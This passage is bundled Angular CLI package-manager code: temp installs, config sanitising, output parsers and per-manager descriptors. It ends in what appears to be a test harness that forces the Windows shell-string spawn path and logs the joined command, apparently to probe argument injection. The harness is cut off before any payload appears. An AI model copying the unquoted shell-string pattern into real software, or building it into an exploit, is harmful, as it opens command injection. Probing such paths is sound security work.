          const manifest = await this.host.readFile(manifestPath);
          return JSON.parse(manifest);
        } finally {
          await cleanup();
        }
      }
      default:
        throw new Error(`Unsupported package specifier type: ${type}`);
    }
  }
  async getTemporaryDirectory() {
    const { tempDirectory } = this.options;
    if (tempDirectory && !(0, import_node_path.relative)(this.cwd, tempDirectory).startsWith("..")) {
      try {
        await this.host.stat(tempDirectory);
      } catch {
        await this.host.mkdir(tempDirectory, { recursive: true });
      }
      return tempDirectory;
    }
    const tempOptions = ["node_modules"];
    for (const tempOption of tempOptions) {
      try {
        const directory = (0, import_node_path.resolve)(this.cwd, tempOption);
        if ((await this.host.stat(directory)).isDirectory()) {
          return directory;
        }
      } catch {
      }
    }
  }
  /**
   * Acquires a package by installing it into a temporary directory. The caller is
   * responsible for managing the lifecycle of the temporary directory by calling
   * the returned `cleanup` function.
   *
   * @param specifier The specifier of the package to install.
   * @param options Options for the installation.
   * @returns A promise that resolves to an object containing the temporary path
   *   and a cleanup function.
   */
  async acquireTempPackage(specifier, options = {}) {
    const workingDirectory = await this.host.createTempDirectory(
      await this.getTemporaryDirectory()
    );
    const cleanup = () => this.host.deleteDirectory(workingDirectory);
    let packageManagerVersion;
    try {
      packageManagerVersion = await this.getVersion();
    } catch {
    }
    const tempPackageJson = packageManagerVersion ? { packageManager: `${this.name}@${packageManagerVersion}` } : {};
    await this.host.writeFile(
      (0, import_node_path.join)(workingDirectory, "package.json"),
      JSON.stringify(tempPackageJson, null, 2)
    );
    if (this.name === "pnpm") {
      try {
        const workspaceConfigPath = (0, import_node_path.join)(this.cwd, "pnpm-workspace.yaml");
        const content = await this.host.readFile(workspaceConfigPath);
        await this.host.writeFile(
          (0, import_node_path.join)(workingDirectory, "pnpm-workspace.yaml"),
          sanitizePnpmWorkspace(content)
        );
      } catch {
        await this.host.writeFile(
          (0, import_node_path.join)(workingDirectory, "pnpm-workspace.yaml"),
          "packages:\n  - '.'\n"
        );
      }
    }
    if (this.descriptor.copyConfigFromProject) {
      for (const configFile of this.descriptor.configFiles) {
        try {
          const configPath = (0, import_node_path.join)(this.cwd, configFile);
          let content = await this.host.readFile(configPath);
          if (this.name === "yarn") {
            content = sanitizeYarnRc(content);
          }
          await this.host.writeFile((0, import_node_path.join)(workingDirectory, configFile), content);
        } catch {
        }
      }
    }
    const flags = [options.ignoreScripts ? this.descriptor.ignoreScriptsFlag : ""].filter(
      (flag) => flag
    );
    const args = [this.descriptor.addCommand, specifier, ...flags];
    try {
      await this.#run(args, { ...options, cwd: workingDirectory });
    } catch (e) {
      await cleanup();
      throw e;
    }
    return { workingDirectory, cleanup };
  }
  /**
   * Gets the active release age gate limit in milliseconds.
   * @returns A promise that resolves to the limit in milliseconds, or `0` if not set.
   */
  async getMinimumReleaseAge() {
    if (this.#minimumReleaseAge === void 0) {
      this.#minimumReleaseAge = this.#resolveMinimumReleaseAge();
    }
    return this.#minimumReleaseAge;
  }
  /**
   * Resolves the active minimum release age by querying the package manager configuration
   * and parsing the resulting setting.
   * @returns A promise that resolves to the limit in milliseconds, or `0` if not set.
   */
  async #resolveMinimumReleaseAge() {
    if (this.descriptor.getReleaseAgeConfigCommand && this.descriptor.outputParsers.getReleaseAge) {
      try {
        const { stdout } = await this.#run(this.descriptor.getReleaseAgeConfigCommand);
        const version = await this.getVersion();
        return this.descriptor.outputParsers.getReleaseAge(stdout, version);
      } catch {
      }
    }
    return 0;
  }
};
function sanitizePnpmWorkspace(content) {
  const lines = content.split(/\r?\n/);
  const result = [];
  let inBlockToRemove = false;
  let blockIndent = 0;
  for (const line of lines) {
    const trimmed = line.trim();
    if (!trimmed) {
      result.push(line);
      continue;
    }
    const indent = line.length - line.trimStart().length;
    if (inBlockToRemove) {
      if (indent > blockIndent) {
        continue;
      }
      inBlockToRemove = false;
    }
    if (trimmed.startsWith("overrides:") || trimmed.startsWith("packages:")) {
      inBlockToRemove = true;
      blockIndent = indent;
      if (trimmed.startsWith("packages:")) {
        result.push(line.replace(/packages:.*/, "packages:\n  - '.'"));
      }
      continue;
    }
    result.push(line);
  }
  return result.join("\n");
}
function sanitizeYarnRc(content) {
  const lines = content.split(/\r?\n/);
  const result = [];
  let inBlockToRemove = false;
  let blockIndent = 0;
  for (const line of lines) {
    const trimmed = line.trim();
    if (!trimmed) {
      result.push(line);
      continue;
    }
    const indent = line.length - line.trimStart().length;
    if (inBlockToRemove) {
      if (indent > blockIndent) {
        continue;
      }
      inBlockToRemove = false;
    }
    if (indent === 0 && (trimmed.startsWith("yarnPath:") || trimmed.startsWith("nodeLinker:") || trimmed.startsWith("plugins:"))) {
      inBlockToRemove = true;
      blockIndent = indent;
      continue;
    }
    result.push(line);
  }
  result.push("nodeLinker: node-modules");
  return result.join("\n");
}

// packages/angular/cli/src/package-managers/host.ts
var import_node_child_process = require("node:child_process");
var import_node_fs = require("node:fs");
var import_promises = require("node:fs/promises");
var import_node_os = require("node:os");
var import_node_path2 = require("node:path");
var NodeJS_HOST = {
  stat: import_promises.stat,
  requiresQuoting: (0, import_node_os.platform)() === "win32",
  mkdir: import_promises.mkdir,
  readFile: (path2) => (0, import_promises.readFile)(path2, { encoding: "utf8" }),
  copyFile: (src, dest) => (0, import_promises.copyFile)(src, dest, import_node_fs.constants.COPYFILE_FICLONE),
  writeFile: import_promises.writeFile,
  createTempDirectory: (baseDir) => (0, import_promises.mkdtemp)((0, import_node_path2.join)(baseDir ?? (0, import_node_os.tmpdir)(), "angular-cli-tmp-packages-")),
  deleteDirectory: (path2) => (0, import_promises.rm)(path2, { recursive: true, force: true }),
  runCommand: async (command, args, options = {}) => {
    const signal = options.timeout ? AbortSignal.timeout(options.timeout) : void 0;
    const isWin32 = (0, import_node_os.platform)() === "win32";
    return new Promise((resolve2, reject) => {
      const env = {
        ...process.env,
        ...options.env,
        //  NPM updater notifier will prevents the child process from closing until it timeout after 3 minutes.
        NO_UPDATE_NOTIFIER: "1",
        NPM_CONFIG_UPDATE_NOTIFIER: "false"
      };
      if ((env["npm_config_registry"] === "https://registry.yarnpkg.com" || env["NPM_CONFIG_REGISTRY"] === "https://registry.yarnpkg.com") && (env["npm_config_user_agent"]?.includes("yarn") || env["NPM_CONFIG_USER_AGENT"]?.includes("yarn"))) {
        delete env["npm_config_registry"];
        delete env["NPM_CONFIG_REGISTRY"];
      }
      const spawnOptions = {
        shell: isWin32,
        stdio: options.stdio ?? "pipe",
        signal,
        cwd: options.cwd,
        env
      };
      const childProcess = isWin32 ? (0, import_node_child_process.spawn)(`${command} ${args.join(" ")}`, spawnOptions) : (0, import_node_child_process.spawn)(command, args, spawnOptions);
      let stdout = "";
      childProcess.stdout?.on("data", (data) => stdout += data.toString());
      let stderr = "";
      childProcess.stderr?.on("data", (data) => stderr += data.toString());
      childProcess.on("close", (code) => {
        if (code === 0) {
          resolve2({ stdout, stderr });
        } else {
          const message = `Process exited with code ${code}.`;
          reject(new PackageManagerError(message, stdout, stderr, code));
        }
      });
      childProcess.on("error", (err) => {
        if (err.name === "AbortError") {
          const message2 = `Process timed out.`;
          reject(new PackageManagerError(message2, stdout, stderr, null));
          return;
        }
        const message = `Process failed with error: ${err.message}`;
        reject(new PackageManagerError(message, stdout, stderr, null));
      });
    });
  }
};

// packages/angular/cli/src/package-managers/parsers.ts
var import_semver2 = __toESM(require_semver2());
var MAX_LOG_LENGTH = 1024;
function logStdout(stdout, logger2) {
  if (!logger2) {
    return;
  }
  let output = stdout;
  if (output.length > MAX_LOG_LENGTH) {
    output = `${output.slice(0, MAX_LOG_LENGTH)}... (truncated)`;
  }
  logger2.debug(`  stdout:
${output}`);
}
function* parseJsonLines(output, logger2) {
  for (const line of output.split("\n")) {
    if (!line.trim()) {
      continue;
    }
    try {
      yield JSON.parse(line);
    } catch (e) {
      logger2?.debug(`  Ignoring non-JSON line: ${e}`);
    }
  }
}
function parseNpmLikeDependencies(stdout, logger2, options) {
  logger2?.debug(`Parsing npm-like dependency list...`);
  logStdout(stdout, logger2);
  const dependencies = /* @__PURE__ */ new Map();
  if (!stdout) {
    logger2?.debug("  stdout is empty. No dependencies found.");
    return dependencies;
  }
  const data = JSON.parse(stdout);
  const workspacePackageName = options?.workspacePackageName;
  let rootProject;
  let subProject;
  if (Array.isArray(data)) {
    rootProject = data[0];
    if (workspacePackageName) {
      subProject = data.find(
        (project) => project?.name === workspacePackageName
      );
    }
  } else {
    rootProject = data;
  }
  if (!rootProject || typeof rootProject !== "object") {
    return dependencies;
  }
  if (subProject) {
    const subprojectMaps = [
      subProject.dependencies,
      subProject.devDependencies,
      subProject.unsavedDependencies
    ].filter((d) => !!d);
    for (const subprojectMap of subprojectMaps) {
      for (const [name, info] of Object.entries(subprojectMap)) {
        if (info && typeof info === "object" && info.version) {
          dependencies.set(name, {
            name,
            version: info.version,
            path: info.path
          });
        }
      }
    }
  } else if (workspacePackageName) {
    const rootDependencyMaps2 = [
      rootProject.dependencies,
      rootProject.devDependencies,
      rootProject.unsavedDependencies
    ].filter((d) => !!d);
    for (const dependencyMap of rootDependencyMaps2) {
      const info = dependencyMap[workspacePackageName];
      if (info && typeof info === "object") {
        const nestedMaps = [
          info.dependencies,
          info.devDependencies,
          info.unsavedDependencies
        ].filter((d) => !!d);
        for (const nestedMap of nestedMaps) {
          for (const [name, nestedInfo] of Object.entries(nestedMap)) {
            if (nestedInfo && typeof nestedInfo === "object" && nestedInfo.version) {
              dependencies.set(name, {
                name,
                version: nestedInfo.version,
                path: nestedInfo.path
              });
            }
          }
        }
      }
    }
  }
  const rootDependencyMaps = [
    rootProject.dependencies,
    rootProject.devDependencies,
    rootProject.unsavedDependencies
  ].filter((d) => !!d);
  for (const dependencyMap of rootDependencyMaps) {
    for (const [name, info] of Object.entries(dependencyMap)) {
      if (!info || typeof info !== "object") {
        continue;
      }
      const isWorkspacePackage = info.resolved?.startsWith("file:") && (!!info.dependencies || !!info.devDependencies || !!info.unsavedDependencies);
      if (info.version && !dependencies.has(name) && !isWorkspacePackage) {
        dependencies.set(name, {
          name,
          version: info.version,
          path: info.path
        });
      }
    }
  }
  logger2?.debug(`  Found ${dependencies.size} dependencies.`);
  return dependencies;
}
function parseYarnClassicDependencies(stdout, logger2) {
  logger2?.debug(`Parsing yarn classic dependency list...`);
  logStdout(stdout, logger2);
  const dependencies = /* @__PURE__ */ new Map();
  if (!stdout) {
    logger2?.debug("  stdout is empty. No dependencies found.");
    return dependencies;
  }
  for (const json of parseJsonLines(stdout, logger2)) {
    if (json.type === "tree" && json.data?.trees) {
      for (const info of json.data.trees) {
        const lastAtIndex = info.name.lastIndexOf("@");
        const name = info.name.slice(0, lastAtIndex);
        const version = info.name.slice(lastAtIndex + 1);
        dependencies.set(name, {
          name,
          version
        });
      }
    }
  }
  logger2?.debug(`  Found ${dependencies.size} dependencies.`);
  return dependencies;
}
function isValidManifest(obj) {
  if (typeof obj !== "object" || obj === null) {
    return false;
  }
  const { name, version } = obj;
  return typeof name === "string" && typeof version === "string" && (0, import_semver2.valid)(version) !== null;
}
function isValidMetadata(obj) {
  if (typeof obj !== "object" || obj === null) {
    return false;
  }
  const { name, versions, "dist-tags": distTags } = obj;
  return typeof name === "string" && Array.isArray(versions) && typeof distTags === "object" && distTags !== null;
}
function parseNpmLikeManifest(stdout, logger2) {
  logger2?.debug(`Parsing npm-like manifest...`);
  logStdout(stdout, logger2);
  if (!stdout) {
    logger2?.debug("  stdout is empty. No manifest found.");
    return null;
  }
  const result = JSON.parse(stdout);
  if (Array.isArray(result)) {
    let maxManifest = null;
    for (const manifest of result) {
      if (!isValidManifest(manifest)) {
        logger2?.debug(
          "  Skipping invalid manifest in array (missing name, version, or invalid SemVer)."
        );
        continue;
      }
      if (!maxManifest || (0, import_semver2.compare)(manifest.version, maxManifest.version) > 0) {
        maxManifest = manifest;
      }
    }
    if (!maxManifest) {
      logger2?.debug("  No valid manifests found in the array.");
    }
    return maxManifest;
  }
  if (!isValidManifest(result)) {
    logger2?.debug(
      "  Parsed JSON is not a valid manifest (missing name, version, or invalid SemVer)."
    );
    return null;
  }
  return result;
}
function parseNpmLikeMetadata(stdout, logger2) {
  logger2?.debug(`Parsing npm-like metadata...`);
  logStdout(stdout, logger2);
  if (!stdout) {
    logger2?.debug("  stdout is empty. No metadata found.");
    return null;
  }
  const result = JSON.parse(stdout);
  if (Array.isArray(result)) {
    for (const item of result) {
      if (isValidMetadata(item)) {
        return item;
      }
    }
    logger2?.debug("  No valid metadata found in the array.");
    return null;
  }
  if (!isValidMetadata(result)) {
    logger2?.debug("  Parsed JSON is not valid metadata (missing name, versions, or dist-tags).");
    return null;
  }
  return result;
}
function parseYarnClassicManifest(stdout, logger2) {
  logger2?.debug(`Parsing yarn classic manifest...`);
  logStdout(stdout, logger2);
  if (!stdout) {
    logger2?.debug("  stdout is empty. No manifest found.");
    return null;
  }
  let manifest;
  for (const json of parseJsonLines(stdout, logger2)) {
    if (json.type === "inspect" && json.data) {
      manifest = json.data;
      break;
    }
  }
  if (!manifest) {
    logger2?.debug("  Failed to find manifest in yarn classic output.");
    return null;
  }
  if (manifest["ng-add"] && typeof manifest["ng-add"] === "object" && Object.keys(manifest["ng-add"]).length === 0) {
    manifest["ng-add"].save ??= false;
  }
  if (!isValidManifest(manifest)) {
    logger2?.debug(
      "  Parsed JSON is not a valid manifest (missing name, version, or invalid SemVer)."
    );
    return null;
  }
  return manifest;
}
function parseYarnClassicMetadata(stdout, logger2) {
  logger2?.debug(`Parsing yarn classic metadata...`);
  logStdout(stdout, logger2);
  if (!stdout) {
    logger2?.debug("  stdout is empty. No metadata found.");
    return null;
  }
  let metadata;
  for (const json of parseJsonLines(stdout, logger2)) {
    if (json.type === "inspect" && json.data) {
      metadata = json.data;
      break;
    }
  }
  if (!metadata) {
    logger2?.debug("  Failed to find metadata in yarn classic output.");
    return null;
  }
  return metadata;
}
function parseNpmLikeError(output, logger2) {
  logger2?.debug(`Parsing npm-like error output...`);
  logStdout(output, logger2);
  if (!output) {
    logger2?.debug("  output is empty. No error found.");
    return null;
  }
  try {
    let jsonError = JSON.parse(output);
    if (Array.isArray(jsonError)) {
      jsonError = jsonError[0];
    }
    if (jsonError && typeof jsonError === "object" && "error" in jsonError) {
      jsonError = jsonError.error;
    }
    if (jsonError && typeof jsonError.code === "string" && (typeof jsonError.summary === "string" || typeof jsonError.message === "string")) {
      const summary = jsonError.summary || jsonError.message;
      logger2?.debug(`  Successfully parsed JSON error with code '${jsonError.code}'.`);
      return {
        code: jsonError.code,
        summary,
        detail: jsonError.detail
      };
    }
  } catch (e) {
    logger2?.debug(`  Failed to parse output as JSON: ${e}. Attempting regex fallback.`);
  }
  const errorCodeMatch = output.match(/npm (ERR!|error) code (E\d{3}|[A-Z_]+)/);
  if (errorCodeMatch) {
    const code = errorCodeMatch[2];
    let summary;
    for (const line of output.split("\n")) {
      if (line.startsWith("npm ERR!") && !line.includes(" code ")) {
        summary = line.replace("npm ERR! ", "").trim();
        break;
      } else if (line.startsWith("npm error") && !line.includes(" code ")) {
        summary = line.replace("npm error ", "").trim();
        break;
      }
    }
    logger2?.debug(`  Successfully parsed text error with code '${code}'.`);
    return {
      code,
      summary: summary || `Package manager error: ${code}`
    };
  }
  logger2?.debug("  Failed to parse npm-like error. No structured error found.");
  return null;
}
function parseYarnClassicError(output, logger2) {
  logger2?.debug(`Parsing yarn classic error output...`);
  logStdout(output, logger2);
  if (!output) {
    logger2?.debug("  output is empty. No error found.");
    return null;
  }
  const statusCodeMatch = output.match(/finished with status code (\d{3})/);
  if (statusCodeMatch) {
    const statusCode = Number(statusCodeMatch[1]);
    if (statusCode < 200 || statusCode >= 300) {
      logger2?.debug(`  Detected HTTP error status code '${statusCode}' in verbose output.`);
      return {
        code: `E${statusCode}`,
        summary: `Request failed with status code ${statusCode}.`
      };
    }
  }
  for (const json of parseJsonLines(output, logger2)) {
    if (json.type === "error" && typeof json.data === "string") {
      const summary = json.data;
      logger2?.debug(`  Successfully parsed generic yarn classic error.`);
      return {
        code: "UNKNOWN_ERROR",
        summary
      };
    }
  }
  logger2?.debug("  Failed to parse yarn classic error. No structured error found.");
  return null;
}
function parseBunDependencies(stdout, logger2) {
  logger2?.debug("Parsing Bun dependency list...");
  logStdout(stdout, logger2);
  const dependencies = /* @__PURE__ */ new Map();
  if (!stdout) {
    return dependencies;
  }
  const lines = stdout.split("\n");
  for (let i = 1; i < lines.length; i++) {
    const line = lines[i].trim();
    if (!line) {
      continue;
    }
    const cleanLine = line.replace(/^[└├]──\s*/, "");
    const match = cleanLine.match(/^(.+?)\s?@([^@\s]+)$/);
    if (match) {
      const name = match[1];
      const version = match[2];
      dependencies.set(name, { name, version });
    }
  }
  logger2?.debug(`  Found ${dependencies.size} dependencies.`);
  return dependencies;
}
function parseYarnModernDependencies(stdout, logger2) {
  logger2?.debug("Parsing Yarn Berry dependency list...");
  logStdout(stdout, logger2);
  const dependencies = /* @__PURE__ */ new Map();
  if (!stdout) {
    return dependencies;
  }
  for (const json of parseJsonLines(stdout, logger2)) {
    if (typeof json === "string") {
      const match = json.match(/^(@?[^@]+)@(.+)$/);
      if (match) {
        const name = match[1];
        let version = match[2];
        if (version.startsWith("npm:")) {
          version = version.slice(4);
        }
        const versionParamMatch = version.match(/::version=([^&]+)/);
        if (versionParamMatch) {
          version = versionParamMatch[1];
        }
        dependencies.set(name, { name, version });
      }
    }
  }
  logger2?.debug(`  Found ${dependencies.size} dependencies.`);
  return dependencies;
}
function parsePnpmReleaseAge(output, version) {
  const value = output.trim();
  if (!value || value === "undefined" || value === "null") {
    const major = parseInt(version.split(".")[0], 10);
    if (major >= 11) {
      return 1440 * 6e4;
    }
    return 0;
  }
  const minutes = parseInt(value, 10);
  return isNaN(minutes) ? 0 : minutes * 6e4;
}
function parseYarnReleaseAge(output, version) {
  const value = output.trim();
  if (!value || value === "undefined" || value === "null") {
    const major = parseInt(version.split(".")[0], 10);
    if (major >= 4) {
      return 1440 * 6e4;
    }
    return 0;
  }
  const match = value.match(/^(\d+)(ms|s|m|h|d|w)?$/);
  if (!match) {
    return 0;
  }
  const amount = parseInt(match[1], 10);
  const unit = match[2];
  if (unit) {
    switch (unit) {
      case "ms":
        return amount;
      case "s":
        return amount * 1e3;
      case "m":
        return amount * 6e4;
      case "h":
        return amount * 36e5;
      case "d":
        return amount * 864e5;
      case "w":
        return amount * 6048e5;
    }
  }
  return amount * 6e4;
}
function parseNpmBeforeDate(output) {
  const trimmed = output.trim();
  if (!trimmed || trimmed === "null" || trimmed === "undefined") {
    return 0;
  }
  const parsedDate = Date.parse(trimmed);
  if (isNaN(parsedDate)) {
    return 0;
  }
  const age = Date.now() - parsedDate;
  return age > 0 ? age : 0;
}

// packages/angular/cli/src/package-managers/package-manager-descriptor.ts
var NOT_FOUND_ERROR_CODES = /* @__PURE__ */ new Set(["E404"]);
function isKnownNotFound(error) {
  return NOT_FOUND_ERROR_CODES.has(error.code);
}
var SUPPORTED_PACKAGE_MANAGERS = {
  npm: {
    binary: "npm",
    lockfiles: ["package-lock.json", "npm-shrinkwrap.json"],
    addCommand: "install",
    installCommand: ["install"],
    forceFlag: "--force",
    saveExactFlag: "--save-exact",
    saveTildeFlag: "--save-tilde",
    saveDevFlag: "--save-dev",
    noLockfileFlag: "--no-package-lock",
    ignoreScriptsFlag: "--ignore-scripts",
    ignorePeerDependenciesFlag: "--force",
    configFiles: [".npmrc"],
    getRegistryOptions: (registry) => ({ args: ["--registry", registry] }),
    versionCommand: ["--version"],
    listDependenciesCommand: ["list", "--depth=0", "--json=true", "--all=true"],
    getReleaseAgeConfigCommand: ["config", "get", "before"],
    getPackageNameCommand: ["pkg", "get", "name"],
    getManifestCommand: ["view", "--json"],
    viewCommandFieldArgFormatter: (fields) => [...fields],
    outputParsers: {
      listDependencies: parseNpmLikeDependencies,
      getRegistryManifest: parseNpmLikeManifest,
      getRegistryMetadata: parseNpmLikeMetadata,
      getError: parseNpmLikeError,
      getReleaseAge: parseNpmBeforeDate
    },
    isNotFound: isKnownNotFound
  },
  yarn: {
    binary: "yarn",
    lockfiles: ["yarn.lock"],
    addCommand: "add",
    installCommand: ["install"],
    forceFlag: "--force",
    saveExactFlag: "--exact",
    saveTildeFlag: "--tilde",
    saveDevFlag: "--dev",
    noLockfileFlag: "",
    ignoreScriptsFlag: "--mode=skip-build",
    configFiles: [".yarnrc.yml", ".yarnrc.yaml"],
    copyConfigFromProject: true,
    getRegistryOptions: (registry) => ({ env: { YARN_NPM_REGISTRY_SERVER: registry } }),
    versionCommand: ["--version"],
    listDependenciesCommand: ["info", "--name-only", "--json"],
    getReleaseAgeConfigCommand: ["config", "get", "npmMinimalAgeGate"],
    getManifestCommand: ["npm", "info", "--json"],
    viewCommandFieldArgFormatter: (fields) => ["--fields", fields.join(",")],
    outputParsers: {
      listDependencies: parseYarnModernDependencies,
      getRegistryManifest: parseNpmLikeManifest,
      getRegistryMetadata: parseNpmLikeMetadata,
      getError: parseNpmLikeError,
      getReleaseAge: parseYarnReleaseAge
    },
    isNotFound: isKnownNotFound
  },
  "yarn-classic": {
    binary: "yarn",
    // This is intentionally empty. `yarn-classic` is not a discoverable package manager.
    // The discovery process finds `yarn` via `yarn.lock`, and the factory logic
    // determines whether it is classic or modern by checking the installed version.
    lockfiles: [],
    addCommand: "add",
    installCommand: ["install"],
    forceFlag: "--force",
    saveExactFlag: "--exact",
    saveTildeFlag: "--tilde",
    saveDevFlag: "--dev",
    noLockfileFlag: "--no-lockfile",
    ignoreScriptsFlag: "--ignore-scripts",
    configFiles: [".yarnrc", ".npmrc"],
    getRegistryOptions: (registry) => ({ args: ["--registry", registry] }),
    versionCommand: ["--version"],
    listDependenciesCommand: ["list", "--depth=0", "--json"],
    getManifestCommand: ["info", "--json", "--verbose"],
    requiresManifestVersionLookup: true,
    outputParsers: {
      listDependencies: parseYarnClassicDependencies,
      getRegistryManifest: parseYarnClassicManifest,
      getRegistryMetadata: parseYarnClassicMetadata,
      getError: parseYarnClassicError
    },
    isNotFound: isKnownNotFound
  },
  pnpm: {
    binary: "pnpm",
    lockfiles: ["pnpm-lock.yaml"],
    addCommand: "add",
    installCommand: ["install"],
    forceFlag: "--force",
    saveExactFlag: "--save-exact",
    saveTildeFlag: "--save-tilde",
    saveDevFlag: "--save-dev",
    noLockfileFlag: "--no-lockfile",
    ignoreScriptsFlag: "--ignore-scripts",
    ignorePeerDependenciesFlag: "--strict-peer-dependencies=false",
    configFiles: [".npmrc", "pnpm-workspace.yaml"],
    getRegistryOptions: (registry) => ({ args: ["--registry", registry] }),
    versionCommand: ["--version"],
    listDependenciesCommand: ["list", "--depth=0", "--json"],
    getReleaseAgeConfigCommand: ["config", "get", "minimum-release-age"],
    getPackageNameCommand: ["pkg", "get", "name"],
    getManifestCommand: ["view", "--json"],
    viewCommandFieldArgFormatter: (fields) => [...fields],
    outputParsers: {
      listDependencies: parseNpmLikeDependencies,
      getRegistryManifest: parseNpmLikeManifest,
      getRegistryMetadata: parseNpmLikeMetadata,
      getError: parseNpmLikeError,
      getReleaseAge: parsePnpmReleaseAge
    },
    isNotFound: isKnownNotFound
  },
  bun: {
    binary: "bun",
    lockfiles: ["bun.lockb", "bun.lock"],
    addCommand: "add",
    installCommand: ["install"],
    forceFlag: "--force",
    saveExactFlag: "--exact",
    saveTildeFlag: "",
    // Bun does not have a flag for tilde, it defaults to caret.
    saveDevFlag: "--development",
    noLockfileFlag: "",
    // Bun does not have a flag for this.
    ignoreScriptsFlag: "--ignore-scripts",
    configFiles: ["bunfig.toml", ".npmrc"],
    copyConfigFromProject: true,
    getRegistryOptions: (registry) => ({ args: ["--registry", registry] }),
    versionCommand: ["--version"],
    listDependenciesCommand: ["pm", "ls"],
    getManifestCommand: ["pm", "view", "--json"],
    getRegistryMetadata: async (packageName, fetchAndParse) => {
      const [distTags, versions] = await Promise.all([
        fetchAndParse(["pm", "view", "--json", packageName, "dist-tags"], (stdout) => {
          if (!stdout) {
            return {};
          }
          const parsed = JSON.parse(stdout);
          return parsed && typeof parsed === "object" && !Array.isArray(parsed) ? parsed : {};
        }),
        fetchAndParse(["pm", "view", "--json", packageName, "versions"], (stdout) => {
          if (!stdout) {
            return null;
          }
          const parsed = JSON.parse(stdout);
          return Array.isArray(parsed) ? parsed : [parsed];
        })
      ]);
      if (!versions || versions.length === 0) {
        return null;
      }
      return {
        name: packageName,
        "dist-tags": distTags || {},
        versions
      };
    },
    outputParsers: {
      listDependencies: parseBunDependencies,
      getRegistryManifest: parseNpmLikeManifest,
      getRegistryMetadata: parseNpmLikeMetadata,
      getError: parseNpmLikeError
    },
    isNotFound: isKnownNotFound
  }
};

// packages/angular/cli/src/commands/update/utilities/cli-version.ts
var semver = __toESM(require_semver2());
init_version();

// packages/angular/cli/src/commands/update/utilities/constants.ts
var ANGULAR_PACKAGES_REGEXP = /^@(?:angular|nguniversal)\//;

// packages/angular/cli/src/commands/update/utilities/cli-version.ts
function coerceVersionNumber(version) {
  if (!version) {
    return void 0;
  }
  if (!/^\d{1,30}\.\d{1,30}\.\d{1,30}/.test(version)) {
    const match = version.match(/^\d{1,30}(\.\d{1,30})*/);
    if (!match) {
      return void 0;
    }
    if (!match[1]) {
      version = version.substring(0, match[0].length) + ".0.0" + version.substring(match[0].length);
    } else if (!match[2]) {
      version = version.substring(0, match[0].length) + ".0" + version.substring(match[0].length);
    } else {
      return void 0;
    }
  }
  return semver.valid(version) ?? void 0;
}
function getCLIUpdateRunnerVersion(packagesToUpdate, next) {
  if (next) {
    return "next";
  }
  const updatingAngularPackage = packagesToUpdate?.find((r) => ANGULAR_PACKAGES_REGEXP.test(r));
  if (updatingAngularPackage) {
    const tempVersion = coerceVersionNumber(updatingAngularPackage.split("@")[2]);
    return semver.parse(tempVersion)?.major ?? "latest";
  }
  return VERSION.major;
}

// packages/angular_devkit/core/src/json/schema/registry.ts
var import_ajv_formats = __toESM(require_dist());

// packages/angular_devkit/core/src/utils/template.ts
var import_source_map = __toESM(require_source_map());
var kHtmlEscapes = {
  "&": "&amp;",
  "<": "&lt;",
  ">": "&gt;",
  '"': "&quot;",
  "'": "&#39;",
  "`": "&#96;"
};
var reUnescapedHtml = new RegExp(`[${Object.keys(kHtmlEscapes).join("")}]`, "g");

// packages/angular_devkit/core/src/workspace/json/reader.ts
var import_jsonc_parser2 = require("jsonc-parser");

// packages/angular_devkit/core/src/workspace/json/metadata.ts
var import_jsonc_parser = require("jsonc-parser");

// packages/angular_devkit/core/src/workspace/json/reader.ts
var ANGULAR_WORKSPACE_EXTENSIONS = Object.freeze(["cli", "newProjectRoot", "schematics"]);
var ANGULAR_PROJECT_EXTENSIONS = Object.freeze(["cli", "schematics", "projectType", "i18n"]);

// packages/angular_devkit/core/src/workspace/json/writer.ts
var import_jsonc_parser3 = require("jsonc-parser");

// packages/angular/cli/src/commands/update/update-resolver.ts
var import_node_fs2 = require("node:fs");
var path = __toESM(require("node:path"));
var import_npm_package_arg2 = __toESM(require_npa());
var semver2 = __toESM(require_semver2());
async function applyUpdatePlan(workspaceRoot, plan, logger2) {
  const packageJsonPath = path.join(workspaceRoot, "package.json");
  const packageJsonContent = await import_node_fs2.promises.readFile(packageJsonPath, "utf8");
  const packageJson = JSON.parse(packageJsonContent);
  const updateDependency = (deps, name, newVersion) => {
    const oldVersion = deps[name];
    const aliasPrefix = "npm:";
    if (oldVersion.startsWith(aliasPrefix)) {
      const specifier = oldVersion.slice(aliasPrefix.length);
      const lastAtIndex = specifier.lastIndexOf("@");
      if (lastAtIndex > 0) {
        const registryName = specifier.slice(0, lastAtIndex);
        const versionRange = specifier.slice(lastAtIndex + 1);
        const execResult = /^[\^~]/.exec(versionRange);
        deps[name] = `${aliasPrefix}${registryName}@${execResult ? execResult[0] : ""}${newVersion}`;
      } else {
        deps[name] = oldVersion;
      }
    } else {
      const execResult = /^[\^~]/.exec(oldVersion);
      deps[name] = `${execResult ? execResult[0] : ""}${newVersion}`;
    }
  };
  for (const [name, targetVersion] of plan.packagesToUpdate.entries()) {
    logger2.info(`Updating package.json with dependency ${name} to version ${targetVersion}...`);
    if (packageJson.dependencies && packageJson.dependencies[name]) {
      updateDependency(packageJson.dependencies, name, targetVersion);
      if (packageJson.devDependencies) {
        delete packageJson.devDependencies[name];
      }
      if (packageJson.peerDependencies) {
        delete packageJson.peerDependencies[name];
      }
    } else if (packageJson.devDependencies && packageJson.devDependencies[name]) {
      updateDependency(packageJson.devDependencies, name, targetVersion);
      if (packageJson.peerDependencies) {
        delete packageJson.peerDependencies[name];
      }
    } else if (packageJson.peerDependencies && packageJson.peerDependencies[name]) {
      updateDependency(packageJson.peerDependencies, name, targetVersion);
    } else {
      if (!packageJson.dependencies) {
        packageJson.dependencies = {};
      }
      packageJson.dependencies[name] = `^${targetVersion}`;
    }
  }
  const eofMatches = packageJsonContent.match(/\r?\n$/);
  const eof = eofMatches?.[0] ?? "";
  const newContent = JSON.stringify(packageJson, null, 2) + eof;
  await import_node_fs2.promises.writeFile(packageJsonPath, newContent, "utf8");
}

// ../../../../../../../private/tmp/n1g/entry-n1g.ts
var FIXTURE = "/tmp/n1g/fixture";
var logged = [];
var log = (s) => {
  logged.push(s);
  console.log(s);
};
var win32Host = {
  ...NodeJS_HOST,
  requiresQuoting: true,
  runCommand: async (command, args, options = {}) => {
    const shellString = `${command} ${args.join(" ")}`;
    log(`[HOST] win32 shell:string -> ${JSON.stringify(shellString)}`);
    return new Promise((resolve2, reject) => {
      const child = (0, import_node_child_process2.spawn)(shellString, {
        shell: "/bin/sh",
        cwd: options.cwd,
        env: { ...process.env, ...options.env, PATH: `/tmp/n1g/bin:${process.env.PATH}` },
        stdio: "pipe"
      });
      let stdout = "";
      let stderr = "";
